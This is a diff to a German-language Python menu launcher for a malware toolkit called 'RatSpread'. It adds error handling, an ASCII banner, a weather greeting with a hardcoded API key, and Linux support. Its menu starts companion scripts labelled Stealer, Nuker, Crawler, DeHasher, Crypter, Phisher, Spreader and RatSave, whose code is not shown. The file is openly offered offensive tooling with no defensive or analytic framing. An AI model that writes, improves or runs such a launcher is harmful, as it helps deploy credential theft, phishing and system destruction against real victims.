@@ -3,36 +3,56 @@ import subprocess
 import time
 from datetime import datetime
 import sys
-import threading
 import locale
 import platform
 import requests
 import importlib
-import Settings
+
 try:
     import RatSpreadVars
 except ImportError:
-    print("RatSpreadVars konnte nicht importiert werden.")
-    RatSpreadVars = type('RatSpreadVars', (object,), {'ascii': '', 'titel': ''})
+    print("RatSpreadVars konnte nicht importiert werden. Verwende Platzhalterwerte.")
+    class RatSpreadVars:
+        ascii = r"""
+______      _   _____                          _      
+| ___ \    | | /  ___|                        | |     
+| |_/ /__ _| |_\ `--. _ __  _ __ ___  __ _  __| |     
+|    // _` | __|`--. \ '_ \| '__/ _ \/ _` |/ _` |     
+| |\ \ (_| | |_/\__/ / |_) | | |  __/ (_| | (_| |     
+\_| \_\__,_|\__\____/| .__/|_|  \___|\__,_|\__,_|     
+                     | |                              
+                     |_|                              
+______ _                _           _     _           
+| ___ \ |              | |         | |   | |          
+| |_/ / | __ _  ___ ___| |__   ___ | | __| | ___ _ __ 
+|  __/| |/ _` |/ __/ _ \ '_ \ / _ \| |/ _` |/ _ \ '__|
+| |   | | (_| | (_|  __/ | | | (_) | | (_| |  __/ |   
+\_|   |_|\__,_|\___\___|_| |_|\___/|_|\__,_|\___|_|
+    """
+        titel = "=== RAT Spread Menu ==="
 
 try:
     import Settings
+    username = getattr(Settings, 'username', 'DefaultUser')
+    city = getattr(Settings, 'city', 'DefaultCity')
+    birthday = getattr(Settings, 'birthday', '01.01.1900')
+    api_key = getattr(Settings, 'api_key', '41f0e608343eaec9c51769c4b41c019a')
+except ImportError:
+    print("Settings konnte nicht importiert werden. Verwende Platzhalterwerte.")
+    class Settings:
+        username = 'DefaultUser'
+        city = 'DefaultCity'
+        birthday = '01.01.1900'
+        api_key = '41f0e608343eaec9c51769c4b41c019a'
     username = Settings.username
     city = Settings.city
     birthday = Settings.birthday
     api_key = Settings.api_key
-except ImportError:
-    print("Settings konnte nicht importiert werden.")
-    username = 'DefaultUser'
-    city = 'DefaultCity'
-    birthday = '01.01.1900'
-    api_key = '41f0e608343eaec9c51769c4b41c019a'
-
-def reload_settings():
-    importlib.reload(Settings)
 
 DEBUG_MODE = True
 SCRIPT_CHECK_ENABLED = False
+threshold_temp = 22
+Version = "0.0.2"
 
 start_stealer = None
 Rat_crypter = None
@@ -43,15 +63,23 @@ Rat_spreader = None
 Rat_nuker = None
 Rat_crawler = None
 Rat_dehasher = None
-Rat_save = None
-
-username = None
-city = None
+Rat_save = None  
 
 today_date = datetime.now().strftime("%d.%m.%Y")
 aktuelle_zeit = time.strftime("%H:%M")
 current_os = platform.system().lower()
-api_key = "41f0e608343eaec9c51769c4b41c019a"
+
+def version():
+    print(f"RatSpread {Version}")
+
+def Start():
+    print(f"{RatSpreadVars.ascii}")
+    print(f"{RatSpreadVars.titel}")
+    version()
+    willkommen()
+
+def Green():
+    os.system("color 0a")
 
 def debug(message):
     if DEBUG_MODE:
@@ -78,8 +106,11 @@ def get_weather():
         return "Stadt nicht gesetzt."
 
     url = f"http://api.openweathermap.org/data/2.5/forecast?q={city}&units=metric&appid={api_key}"
-    response = requests.get(url)
-    data = response.json()
+    try:
+        response = requests.get(url)
+        data = response.json()
+    except Exception as e:
+        return f"Fehler bei der API-Anfrage: {e}"
 
     if response.status_code != 200:
         return f"Fehler bei der API-Anfrage: {data.get('message', 'Unbekannter Fehler')}"
@@ -87,7 +118,6 @@ def get_weather():
     if 'list' in data:
         current_temp = data['list'][0]['main']['temp']
         current_time = datetime.fromtimestamp(data['list'][0]['dt'])
-        threshold_temp = 29
         exceed_time = None
 
         for forecast in data['list']:
@@ -120,7 +150,7 @@ def initialize_scripts():
     Rat_nuker = find_script("RatSpreadSystemNuker.py")
     Rat_crawler = find_script("RatCrawler.py")
     Rat_dehasher = find_script("RatDeHasher.py")
-    Rat_save = find_script("RatSave.py") 
+    Rat_save = find_script("RatSave.py")  
 
     if SCRIPT_CHECK_ENABLED:
         start_stealer_executable = current_os == "windows" and bool(start_stealer)
@@ -132,18 +162,18 @@ def initialize_scripts():
         rat_nuker_executable = check_script_executable(Rat_nuker)
         rat_crawler_executable = check_script_executable(Rat_crawler)
         rat_dehasher_executable = check_script_executable(Rat_dehasher)
-        rat_save_executable = check_script_executable(Rat_save) 
+        rat_save_executable = check_script_executable(Rat_save)  
     else:
-        start_stealer_executable = True
-        rat_crypter_executable = True
-        rat_encrypter_executable = True
-        rat_setup_executable = True
-        rat_phisher_executable = True
-        rat_spreader_executable = True
-        rat_nuker_executable = True
-        rat_crawler_executable = True
-        rat_dehasher_executable = True
-        rat_save_executable = True 
+        start_stealer_executable = bool(start_stealer)
+        rat_crypter_executable = bool(Rat_crypter)
+        rat_encrypter_executable = bool(Rat_encrypter)
+        rat_setup_executable = bool(Rat_setup)
+        rat_phisher_executable = bool(Rat_phisher)
+        rat_spreader_executable = bool(Rat_spreader)
+        rat_nuker_executable = bool(Rat_nuker)
+        rat_crawler_executable = bool(Rat_crawler)
+        rat_dehasher_executable = bool(Rat_dehasher)
+        rat_save_executable = bool(Rat_save)  
 
     return {
         "start_stealer": start_stealer_executable,
@@ -155,19 +185,18 @@ def initialize_scripts():
         "Rat_nuker": rat_nuker_executable,
         "Rat_crawler": rat_crawler_executable,
         "Rat_dehasher": rat_dehasher_executable,
-        "Rat_save": rat_save_executable  
+        "Rat_save": rat_save_executable
     }
 
 def print_menu(script_status):
     global aktuelle_zeit
     if not DEBUG_MODE:
         os.system("cls" if os.name == "nt" else "clear")
-        os.system("color 0a" if os.name == "nt" else "")
-
-    print(f"{RatSpreadVars.ascii}")
-    print(f"{RatSpreadVars.titel}")
-
-    willkommen()
+        if os.name == "nt":
+            os.system("color 0a")
+#==========================================    
+    Start() #Start Anzeige, Ascii, etc
+#==========================================
     weather_info = get_weather()
     if weather_info:
         print(weather_info)
@@ -175,10 +204,10 @@ def print_menu(script_status):
 
     def mark_script(name, status):
         if status:
-            return f"{name}: {'🗸'}"
+            return f"{name}: 🗸"
         else:
-            return f"{name}: {'✗'} (Nicht ausführbar)"
-
+            return f"{name}: ✗ (Nicht gefunden)"
+    
     print(mark_script('Stealer', script_status['start_stealer']))
     print(mark_script('Nuker', script_status['Rat_nuker']))
     print(mark_script('Crawler', script_status['Rat_crawler']))
@@ -188,17 +217,25 @@ def print_menu(script_status):
     print(mark_script('Setup', script_status['Rat_setup']))
     print(mark_script('Phisher', script_status['Rat_phisher']))
     print(mark_script('RatSave', script_status['Rat_save'])) 
-    
     print(" ")
 
     for key, value in menu_options.items():
         print(f"{key}: {value}")
 
 def willkommen():
+    print(" ")
     global username, city
 
-    stunde = int(time.strftime("%H"))
-    locale.setlocale(locale.LC_TIME, 'de_DE.UTF-8')
+    try:
+        stunde = int(time.strftime("%H"))
+    except ValueError:
+        stunde = 12  
+
+    try:
+        locale.setlocale(locale.LC_TIME, 'de_DE.UTF-8')
+    except locale.Error:
+        locale.setlocale(locale.LC_TIME, '')  
+
     wochentag = datetime.now().strftime("%A")
     if 5 <= stunde < 12:
         gruß = "Guten Morgen"
@@ -213,15 +250,15 @@ def willkommen():
     geburtstag = get_birthday()
     if geburtstag and geburtstag == today_date:
         gruß = f"Herzlichen Glückwunsch zum Geburtstag, {username}!"
-    
     print(f"{gruß}, {username}! Heute ist {wochentag} der {today_date}")
-    print(f"Wir haben {aktuelle_zeit} {grußend}")
+    print(f"Wir haben {aktuelle_zeit} {grußend} {Version}")
+
 def get_birthday():
     try:
         with open('Settings.py', 'r') as settings_file:
             for line in settings_file:
                 if line.startswith('birthday'):
-                    return line.split('=')[1].strip().strip("'")
+                    return line.split('=')[1].strip().strip("'").strip('"')
     except FileNotFoundError:
         return None
     except IOError as e:
@@ -230,13 +267,22 @@ def get_birthday():
 def set_birthday(date):
     global birthday
     birthday = date
-    with open('Settings.py', 'a') as settings_file:
-        settings_file.write(f"birthday = '{date}'\n")
+    try:
+        with open('Settings.py', 'a') as settings_file:
+            settings_file.write(f"\nbirthday = '{date}'\n")
+    except IOError as e:
+        error_menu(f"Fehler beim Schreiben der Datei: {e}")
 
 def option1():
     if start_stealer:
         debug("Stealer-Skript wird ausgeführt")
-        subprocess.run(["cmd", "/c", "call", start_stealer])
+        try:
+            if current_os == "windows":
+                subprocess.run(["cmd", "/c", "call", start_stealer], check=True)
+            else:
+                subprocess.run(["bash", start_stealer], check=True)
+        except subprocess.CalledProcessError as e:
+            error_menu(f"Fehler beim Ausführen des Stealer-Skripts: {e}")
     else:
         debug("Stealer-Skript nicht gefunden.")
         print("start_stealer_win.bat konnte nicht gefunden werden.")
@@ -244,7 +290,10 @@ def option1():
 def option2():
     if Rat_nuker:
         debug("Nuker-Skript wird ausgeführt")
-        subprocess.run(["python", Rat_nuker])
+        try:
+            subprocess.run(["python", Rat_nuker], check=True)
+        except subprocess.CalledProcessError as e:
+            error_menu(f"Fehler beim Ausführen des Nuker-Skripts: {e}")
     else:
         debug("Nuker-Skript nicht gefunden.")
         print("RatSpreadSystemNuker.py konnte nicht gefunden werden.")
@@ -252,7 +301,10 @@ def option2():
 def option3():
     if Rat_crawler:
         debug("Crawler-Skript wird ausgeführt")
-        subprocess.run(["python", Rat_crawler])
+        try:
+            subprocess.run(["python", Rat_crawler], check=True)
+        except subprocess.CalledProcessError as e:
+            error_menu(f"Fehler beim Ausführen des Crawler-Skripts: {e}")
     else:
         debug("Crawler-Skript nicht gefunden.")
         print("RatCrawler.py konnte nicht gefunden werden.")
@@ -260,7 +312,10 @@ def option3():
 def option4():
     if Rat_dehasher:
         debug("DeHasher-Skript wird ausgeführt")
-        subprocess.run(["python", Rat_dehasher])
+        try:
+            subprocess.run(["python", Rat_dehasher], check=True)
+        except subprocess.CalledProcessError as e:
+            error_menu(f"Fehler beim Ausführen des DeHasher-Skripts: {e}")
     else:
         debug("DeHasher-Skript nicht gefunden.")
         print("RatDeHasher.py konnte nicht gefunden werden.")
@@ -275,26 +330,16 @@ def verschluesselungs_menu():
     }
 
     while True:
-        print("Verschlüsselungsmenü:")
+        print("\nVerschlüsselungsmenü:")
         for key, value in verschluesselungs_menu_options.items():
             print(f"{key}: {value}")
         
         try:
             option = int(input('Bitte wähle eine Option: '))
             if option == 1:
-                if Rat_crypter:
-                    debug("Verschlüsselungsskript wird ausgeführt")
-                    subprocess.run(["python", Rat_crypter])
-                else:
-                    debug("Verschlüsselungsskript nicht gefunden.")
-                    print("Ratcodierung.py konnte nicht gefunden werden.")
+                option5()
             elif option == 2:
-                if Rat_encrypter:
-                    debug("Entschlüsselungsskript wird ausgeführt")
-                    subprocess.run(["python", Rat_encrypter])
-                else:
-                    debug("Entschlüsselungsskript nicht gefunden.")
-                    print("Ratuncode.py konnte nicht gefunden werden.")
+                option6()
             elif option == 3:
                 debug("Zurück zum Hauptmenü")
                 break
@@ -307,10 +352,35 @@ def verschluesselungs_menu():
         except Exception as e:
             error_menu(str(e))
 
+def option5():
+    if Rat_crypter:
+        debug("Verschlüsselungs-Skript wird ausgeführt")
+        try:
+            subprocess.run(["python", Rat_crypter], check=True)
+        except subprocess.CalledProcessError as e:
+            error_menu(f"Fehler beim Ausführen des Verschlüsselungs-Skripts: {e}")
+    else:
+        debug("Verschlüsselungs-Skript nicht gefunden.")
+        print("Ratcodierung.py konnte nicht gefunden werden.")
+
+def option6():
+    if Rat_encrypter:
+        debug("Entschlüsselungs-Skript wird ausgeführt")
+        try:
+            subprocess.run(["python", Rat_encrypter], check=True)
+        except subprocess.CalledProcessError as e:
+            error_menu(f"Fehler beim Ausführen des Entschlüsselungs-Skripts: {e}")
+    else:
+        debug("Entschlüsselungs-Skript nicht gefunden.")
+        print("Ratuncode.py konnte nicht gefunden werden.")
+
 def option7():
     if Rat_setup:
         debug("Setup-Skript wird ausgeführt")
-        subprocess.run(["python", Rat_setup])
+        try:
+            subprocess.run(["python", Rat_setup], check=True)
+        except subprocess.CalledProcessError as e:
+            error_menu(f"Fehler beim Ausführen des Setup-Skripts: {e}")
     else:
         debug("Setup-Skript nicht gefunden.")
         print("start_setup.py konnte nicht gefunden werden.")
@@ -318,15 +388,21 @@ def option7():
 def option8():
     if Rat_phisher:
         debug("Phisher-Skript wird ausgeführt")
-        subprocess.run(["python", Rat_phisher])
+        try:
+            subprocess.run(["python", Rat_phisher], check=True)
+        except subprocess.CalledProcessError as e:
+            error_menu(f"Fehler beim Ausführen des Phisher-Skripts: {e}")
     else:
         debug("Phisher-Skript nicht gefunden.")
         print("RatPhisher.py konnte nicht gefunden werden.")
 
 def option9():
-    if Rat_save:  
+    if Rat_save:
         debug("RatSave-Skript wird ausgeführt")
-        subprocess.run(["python", Rat_save])
+        try:
+            subprocess.run(["python", Rat_save], check=True)
+        except subprocess.CalledProcessError as e:
+            error_menu(f"Fehler beim Ausführen des RatSave-Skripts: {e}")
     else:
         debug("RatSave-Skript nicht gefunden.")
         print("RatSave.py konnte nicht gefunden werden.")
@@ -340,21 +416,25 @@ menu_options = {
     6: "Setup starten",
     7: "Phisher starten",
     8: "RatSave starten", 
-    9: "Beenden"  
+    9: "Beenden" 
 }
 
 def error_menu(error_message):
     debug(f"Fehler aufgetreten: {error_message}")
-    print(f"Ein Fehler ist aufgetreten: {error_message}")
+    if not DEBUG_MODE:
+        os.system("cls" if os.name == "nt" else "clear")
+        if os.name == "nt":
+            os.system("color 04")
+    print("Ein Fehler ist aufgetreten:")
+    print(f"{error_message}")
     input("Drücke Enter, um fortzufahren...")
+    # sys.exit(1)
 
-if __name__ == '__main__':
+def main_menu():
     script_status = initialize_scripts()
-
     while True:
         try:
             print_menu(script_status)
-            option = ''
             try:
                 option = int(input('Bitte wähle eine Option: '))
             except ValueError:
@@ -381,11 +461,17 @@ if __name__ == '__main__':
             elif option == 9:
                 debug("Programm wird beendet")
                 print('Danke für die Nutzung des Programms.')
-                sys.exit()
+                sys.exit(0)
             else:
                 debug(f"Ungültige Option ausgewählt: {option}")
                 print('Ungültige Option. Bitte eine Zahl zwischen 1 und 9 eingeben.')
         except KeyboardInterrupt:
-            debug("Strg+C im Hauptmenü gedrückt, ignoriert")
+            debug("Strg+C im Hauptmenü gedrückt, Programm wird beendet")
+            print('\nProgramm beendet.')
+            sys.exit(0)
         except Exception as e:
             error_menu(str(e))
+
+if __name__ == "__main__":
+    Green()
+    main_menu()
